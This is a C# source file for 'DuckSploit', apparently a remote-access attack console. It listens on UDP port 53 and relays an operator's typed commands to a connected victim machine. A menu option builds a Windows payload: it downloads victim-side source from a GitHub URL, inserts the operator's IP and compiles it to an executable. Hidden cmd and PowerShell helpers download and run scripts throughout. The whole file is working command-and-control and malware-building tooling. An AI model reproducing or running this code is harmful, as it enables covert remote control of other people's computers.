using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;

namespace DSserver
{
    class Program
    {
		public static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			
			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
			
			
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = tempdir + "/download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + tempdir + "/download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			string output = "";
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
			
		}
		public static void write_txt_to_file(string path, string str)
		{
			FileStream streamfile = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
		}
		public static void execute(string path)
        {
            
			
			string callcommand = "/c call " + path ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void sendmsg(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.WriteLine(message);
				Console.ResetColor();
			}
		}
		public static void sendmsgnonewline(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.Write(message);
				Console.ResetColor();
			}
		}
		public static string gethtmlcode(string url)
		{
			string tempdir = Path.GetTempPath(); 
			try
			{
				File.Delete(tempdir + "last.txt");
			}
			catch (Exception e)
			{
				// nothin'
			}
			
			string callcommand = "(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + tempdir + "/last.txt')";
			
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("powershell.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();

			string path = tempdir + "/last.txt";
			string readText = File.ReadAllText(path);
			return readText;
			

			
		}
		public static void execpowershell(string cmd)
		{
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("powershell.exe", cmd);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
		}
		public static void exec_cmd(string cmd)
		{
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("cmd.exe", cmd);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
		}
        static void Main(string[] args)
        {
			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
			string tempdir = Path.GetTempPath(); 
			string dir = userprofile + "\\DuckSploit"; 
			if (! Directory.Exists(dir)) 
			{
				Directory.CreateDirectory(dir);
			}
			
            UDPSocket s = new UDPSocket();
            s.Server("0.0.0.0", 53);
			int a = 0;
			while(a == 0)
			{
				Console.WriteLine(" ");
				sendmsg("        dP                   dP                         dP          oo   dP   ", "green");
				sendmsg("        88                   88                         88               88   ", "green");
				sendmsg("  .d888b88 dP    dP .d8888b. 88  .dP  .d8888b. 88d888b. 88 .d8888b. dP d8888P ", "green");
				sendmsg("  88'  '88 88    88 88'   `` 88888'`  Y8ooooo. 88'  '88 88 88'  '88 88   88   ", "green");
				sendmsg("  88.  .88 88.  .88 88.  ... 88  '8b.       88 88.  .88 88 88.  .88 88   88   ", "green");
				sendmsg("  '88888P8 '88888P' '88888P' dP   'YP '88888P' 88Y888P' dP '88888P' dP   dP   ", "green");
				sendmsg("                                               88                              ", "green");
				sendmsg("                                               dP                              ", "green");
				sendmsg("                            | DuckSploit V1.0.8 |                         ", "green");
				
				// # Wait
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("1", "red");
				sendmsg("] Wait", "yellow");
				// # Open chat
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("2", "red");
				sendmsg("] Open chat", "yellow");
				// # Build malware
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("3", "red");
				sendmsg("] Generate payload", "yellow");
				// # Visit website
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("4", "red");
				sendmsg("] Visit our website", "yellow");
				// # Exit
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("5", "red");
				sendmsgnonewline("] Exit", "yellow");
				Console.WriteLine(" ");

				sendmsgnonewline("Choose option [", "green");
				sendmsgnonewline("1", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("2", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("3", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("4", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("5", "yellow");
				sendmsgnonewline("]: ", "green");
				
				string menu = Console.ReadLine(); 
				
				
				if(menu == "1")
				{
					a = 1;
					Console.ForegroundColor = ConsoleColor.Red;
					Console.Write("[");
					Console.ResetColor();
					Console.Write("*");
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("] Waiting for connection...");
					while(true)
					{
						if (s.connected)
						{
							string input2;
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("DS> ");
							Console.ResetColor();
							
							input2 = Console.ReadLine();
							string[] input = input2.Split(' ');

							if(input[0] == "help")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/help.txt"), "green");
							}
							else if(input[0] == "clear")
							{
								Console.Clear();

							}
							else if(input2 == "malware --help")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/malwarehelp.txt"), "green");
							}
							else if(input[0] == "cls")
							{
								Console.Clear();
							}
							else if(input[0] == "exit")
							{
								Console.Clear();
								sendmsg("[o] Exited from the console.", "red");
								break;
							}
							else if(input[0] == "credits")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/credits.txt"), "green");
							}
							else
							{
								s.Send(input2);
							}
						}
					}
					s.close();
				}
				else if(menu == "2")
				{
					a = 1;
					Console.WriteLine("soon");
				}
				else if(menu == "3")
				{
					Console.Clear();
					int b = 0;
					while(b == 0)
					{
						sendmsg("DuckSploit payload generator", "green");
						Console.WriteLine(" ");
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("1", "red");
						sendmsg("] Windows", "yellow");
						// # Windows
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("2", "red");
						sendmsg("] Linux", "yellow");
						// # Linux
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("3", "red");
						sendmsg("] Android", "yellow");
						// # Android
						sendmsgnonewline("    [", "yellow");
						sendmsgnonewline("4", "red");
						sendmsg("] Exit", "yellow");

						sendmsgnonewline("Choose option [", "green");
						sendmsgnonewline("1", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("2", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("3", "yellow");
						sendmsgnonewline(",", "red");
						sendmsgnonewline("4", "yellow");
						sendmsgnonewline("]: ", "green");
						
						string menu2 = Console.ReadLine(); 
						if(menu2 == "1")
						{
							Console.Clear();
							
							if (File.Exists(@"C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe")) {
								sendmsg("[o] csc.exe v3.5 is installed", "yellow");
								Console.WriteLine(" ");
								
								sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
								string myip = Console.ReadLine(); 
								
								sendmsg("Downloading executable...", "yellow");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "/DSwindows.cs");
								sendmsg("Downloaded!", "yellow");
								
								string text = File.ReadAllText(tempdir + "/DSwindows.cs");
								text = text.Replace("<yourip>", myip);
								File.WriteAllText(tempdir + "/DSwindows.cs", text);
								Console.Clear();
								sendmsg("Loading...", "yellow");
								
								execute_cmd("mkdir " + dir + "\\generated");
								execute_cmd("call %windir%\\Microsoft.NET\\Framework\\v3.5\\csc.exe /out:" + dir + "\\generated\\DSWindows_payload.exe %temp%\\DSwindows.cs");
								Console.Clear();
								
								sendmsg("DS payload is now generated! ", "yellow");
								sendmsg("Can be found at: " + dir + "\\generated\\DSWindows_payload.exe", "yellow");
							}
							else
							{
								sendmsg("/!\\ MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload", "red");
							}
							b = 1;
							Console.ReadKey();
						}
						else if(menu2 == "2")
						{
							Console.Clear();
							Console.WriteLine("Linuxxxx");
							b = 1;
							Console.ReadKey();
						}
						else if(menu2 == "3")
						{
							Console.Clear();
							Console.WriteLine("aaaandroid");
							b = 1;
							Console.ReadKey();
						}
						else if(menu2 == "4")
						{
							Console.Clear();
							b = 1;
						}
						else
						{
							Console.Clear();
							sendmsg("[x] Bad awnser, only 1,2,3,4 accepted", "red");
						}
					}
					b = 0;
					
				}
				else if(menu == "4")
				{
					a = 1;
					System.Diagnostics.Process.Start("https://ducksploit.com");
				}
				else if(menu == "5")
				{
					a = 1;
					Console.Clear();
					sendmsg("[o] Exited from the console...", "red");
				}
				else
				{
					Console.Clear();
					sendmsg("[x] Unknown awnser (only 1,2,3 or 4 are allowed)", "red");
				}
			}
        }
    }
}
